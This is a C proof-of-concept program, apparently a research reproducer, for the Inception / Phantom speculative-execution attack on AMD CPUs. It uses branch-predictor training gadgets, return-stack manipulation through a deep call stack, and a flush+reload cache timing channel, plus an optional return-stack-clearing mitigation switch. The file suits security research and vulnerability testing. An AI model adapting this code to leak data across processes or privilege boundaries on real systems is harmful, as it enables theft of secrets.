#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ucontext.h>
#include <unistd.h>
#include <x86intrin.h>

#define PWN_PATTERN 0x100100000000
#define ADDRESS_A 0x20000000
#define ADDRESS_B (ADDRESS_A ^ PWN_PATTERN)
#define CACHE_THRESHOLD 120
#define ITERATIONS 10

// Hopefully tricks the prefetcher to avoid false positives.
#define PREFETCH_OFFSET 0x800

static int should_segfault = 0;

static void pin_cpu(int cpu) {
  cpu_set_t set;
  CPU_ZERO(&set);

  CPU_SET(cpu, &set);
  sched_setaffinity(0, sizeof(set), &set);
}

// Load a byte from memory and time how long it takes
static uint64_t time_load(const void *addr) {
  uint64_t ret;

  asm volatile(
      // rdtscp waits for earlier instructions to retire before reading the
      // TSC.
      "rdtscp\n"
      // timestamp in r8d:ebx
      "mov %%eax, %%ebx\n"
      "mov %%edx, %%r8d\n"
      "lfence\n"

      // Do the memory access.
      "movb (%%rdi), %%cl\n"

      // On AMD/Linux lfence always waits for all previous instructions to
      // retire before executing the next instruction.
      "rdtscp\n"
      // timestamp in edx:eax
      "lfence\n"

      "shlq $32, %%r8\n"
      // timestamp in rbx
      "orq %%r8, %%rbx\n"
      "shlq $32, %%rdx\n"
      // timestamp in rax
      "orq %%rdx, %%rax\n"
      "subq %%rbx, %%rax\n"
      : "=a"(ret)
      : "D"(addr)
      : "rbx", "rcx", "rdx", "r8");

  return ret;
}

static __attribute__((naked, noinline)) void train_arch(
    uint64_t target, uint64_t training_code) {
  asm volatile(
      "mov %0, %%r8\n\t"
      // Used to recover from crash
      "leaq 1f(%%rip), %%rcx\n\t"

      "jmp *%%rsi\n"

      "1:\n"
      "pop %%rax\n\t"
      "2:"
      "retq\n" ::"r"(target),
      "S"(training_code)
      : "memory", "r8");
}

extern void *a_start, *a_load, *a_end;
extern void *b_start, *b_load, *b_end;

#define STR(x) #x
#define XSTR(s) STR(s)
static __attribute__((naked, noinline, used)) void gadgets() {
  asm("a_start:\n"
#ifndef NO_DSI
      "  push %rax\n"
      "  push %rbx\n"
      "  push %rcx\n"
      "  push %rdx\n"
      "  cpuid\n"
      "  pop %rdx\n"
      "  pop %rcx\n"
      "  pop %rbx\n"
      "  pop %rax\n"
#endif
      // PhantomJMP
      "  nop\n"
      "  nop\n"
      "  ret\n"
      ".skip 0x1000, 0x90\n"
      "a_load:\n"
      // PhantomCALL
      "  call a_some_func\n"
      // Loads from rdi which points to a fr_array entry
      "  movq " XSTR(PREFETCH_OFFSET) "(%rdi), %rax\n"
      "  xor %rdi, %rdi\n"
      "  ret\n"
      "a_some_func:\n"
      "  ret\n"
      "a_end:\n");

  asm("b_start:\n"
#ifndef NO_DSI
      "  nop\n"
      "  nop\n"
      "  nop\n"
      "  nop\n"
      "  nop\n"
      "  nop\n"
      "  nop\n"
      "  nop\n"
      "  nop\n"
      "  nop\n"
#endif
      "  call *%r8\n"  // training jmp
      ".skip 0x1000, 0x90\n"
      "b_load:\n"
      "  call *%r8\n"  // training call
      "b_end:\n");
}

#define lfsr_advance(lfsr)                                              \
  {                                                                     \
    uint8_t bit = (lfsr ^ (lfsr >> 2) ^ (lfsr >> 3) ^ (lfsr >> 4)) & 1; \
    lfsr = (lfsr >> 1) | (bit << 7);                                    \
  }

#define FR_COUNT 256
#define FR_ARRAY_SIZE (2 * 1024 * 1024)
#define FR_STRIDE 0x1000

static void *fr_array;

static __always_inline void inception_flush(void) {
  for (int i = 0; i < FR_COUNT; i++) {
    asm volatile("clflush (%0)"
                 :
                 : "r"(fr_array + i * FR_STRIDE + PREFETCH_OFFSET)
                 : "memory");
  }

  asm volatile("mfence" ::: "memory");
}
static __always_inline void inception_flush_one(uint64_t ptr) {
  asm volatile("clflush (%0); mfence" : : "r"(ptr) : "memory");
}

static __always_inline uint8_t inception_reload(int hits[]) {
  asm volatile("mfence" ::: "memory");

  // use lfsr because of aggressive prefetching
  uint8_t lfsr = 123;

  uint64_t t = time_load(fr_array + PREFETCH_OFFSET);
  inception_flush_one((uint64_t)fr_array + PREFETCH_OFFSET);
  if (t < CACHE_THRESHOLD) hits[0] = 1;

  for (int i = 1; i < FR_COUNT; i++) {
    lfsr_advance(lfsr);
    uint64_t t = time_load(fr_array + lfsr * FR_STRIDE + PREFETCH_OFFSET);
    // flush immediately after
    inception_flush_one(
        (uint64_t)(fr_array + lfsr * FR_STRIDE + PREFETCH_OFFSET));

    if (t < CACHE_THRESHOLD) hits[lfsr] = 1;
  }

  return 0;
}

static void handle_segv(int sig, siginfo_t *si, void *ucontext) {
  ucontext_t *ctx = ucontext;

  if (!should_segfault) {
    printf("Unexpected segfault\n");
    exit(1);
  }

  should_segfault = 0;
  ctx->uc_mcontext.gregs[REG_RIP] = ctx->uc_mcontext.gregs[REG_RCX];
}

extern void deep_callstack_done(void);

int main(int argc, char *argv[]) {
  int depth = 20;
  if (argc >= 2) {
    depth = atoi(argv[1]);

    if (depth < 2) {
      printf("invalid depth. Must be >= 2\n");
      exit(EXIT_FAILURE);
    }
  }

  struct sigaction sa;
  sa.sa_flags = SA_SIGINFO;
  sigemptyset(&sa.sa_mask);
  sa.sa_sigaction = &handle_segv;
  sigaction(SIGSEGV, &sa, NULL);

  printf("inception\n");

  pin_cpu(1);

  fr_array = mmap((void *)0x10000000, 2 * 1024 * 1024, PROT_READ | PROT_WRITE,
                  MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
  memset(fr_array, 'A', 2 * 1024 * 1024);

  void *a = (void *)mmap((void *)ADDRESS_A, 2 * 1024 * 1024,
                         PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
  memcpy((void *)a, &a_start, (uint64_t)&a_end - (uint64_t)&a_start);

  void *b = (void *)mmap((void *)ADDRESS_B, 2 * 1024 * 1024,
                         PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
  memcpy((void *)b, &b_start, (uint64_t)&b_end - (uint64_t)&b_start);

  if ((uint64_t)&a_load - (uint64_t)&a_start !=
      (uint64_t)&b_load - (uint64_t)&b_start) {
    printf("mismatch: %lx vs %lx\n", (uint64_t)&a_load - (uint64_t)&a_start,
           (uint64_t)&b_load - (uint64_t)&b_start);
    return 0;
  }

  for (int j = 0; j < ITERATIONS; j++) {
    munmap(a, 2 * 1024 * 1024);

    mprotect(b, 2 * 1024 * 1024, PROT_READ | PROT_WRITE | PROT_EXEC);

    // Train
    for (int i = 0; i < 2; i++) {
      should_segfault = 1;
      train_arch(ADDRESS_A + ((uint64_t)&a_load - (uint64_t)&a_start),
                 (ADDRESS_B + (uint64_t)&b_start - (uint64_t)&b_start));

      should_segfault = 1;
      train_arch(ADDRESS_A + ((uint64_t)&a_load - (uint64_t)&a_start),
                 (ADDRESS_B + (uint64_t)&b_load - (uint64_t)&b_start));
    }

    // mark b as NX
    mprotect(b, 2 * 1024 * 1024, PROT_READ | PROT_WRITE);

    a = (void *)mmap((void *)ADDRESS_A, 2 * 1024 * 1024,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
    memcpy((void *)a, &a_start, (uint64_t)&a_end - (uint64_t)&a_start);

    printf("==== round %d =====\n", j);

    // FLush
    inception_flush();

    // Trigger victim
    // deep call stack
    asm volatile(
        "push %3; mfence\n\t"  // last ret will exit
        "z: cmp $2, %0; jle out; dec %0\n\t"
        "call z\n\t"
        // shift the fr_array ptr
        "add $0x1000, %%rdi; ret\n\t"

        "out:\n\t"
        "mov %1, %%rdi\n\t"
        "call *%2\n\t"

#ifdef MITIGATION
#ifndef RSB_DEPTH
#define RSB_DEPTH 32
#endif
        // RSB clearing
        ".rept " XSTR(RSB_DEPTH) "\n"
        "call 1f\n"
        "int3\n"
        "1:\n"
        ".endr\n"
        "add $(8 * " XSTR(RSB_DEPTH) "), %%rsp\n"
#endif
        // shift the fr_array ptr
        "add $0x1000, %%rdi\n\t"
        "ret\n\t"
        "deep_callstack_done:"
        :
        : "r"(depth), "r"(fr_array), "r"(a), "r"(deep_callstack_done)
        : "rdi", "memory", "rcx");

    // Reload
    int hits[256] = {};
    inception_reload(hits);

    for (int i = 0; i < 256; i++)
      if (hits[i]) printf("hit for %d\n", i);

    fflush(stdout);
  }

  return 0;
}
